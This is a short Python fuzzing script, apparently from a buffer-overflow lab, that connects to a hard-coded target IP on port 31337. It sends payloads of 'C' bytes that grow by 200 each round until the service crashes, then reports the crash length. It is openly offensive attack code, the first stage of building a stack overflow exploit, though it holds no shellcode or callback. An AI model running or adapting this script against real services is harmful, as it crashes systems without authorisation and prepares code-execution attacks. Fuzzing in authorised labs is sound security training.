#!/usr/bin/env python3

import socket
from time import sleep

# Target Information

RHOST = "192.168.226.225"   # IP of target Remote Host
RPORT = 31337   # Listening Port

# Build Response

buf = b""
buf += b"C"*100    # send payload to crash program

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create IPV4 socket, TCP type
    s.connect((RHOST,RPORT)) # connect to remote host on   port
    while True:
        print(f"Sending payload: {len(buf)}bytes") # get size
        s.send(buf + b"\n")
        data = s.recv(1024)
        buf += b"C"*200
except:
    print(f"Vulnerable! Crash at around: {len(buf)}")
    exit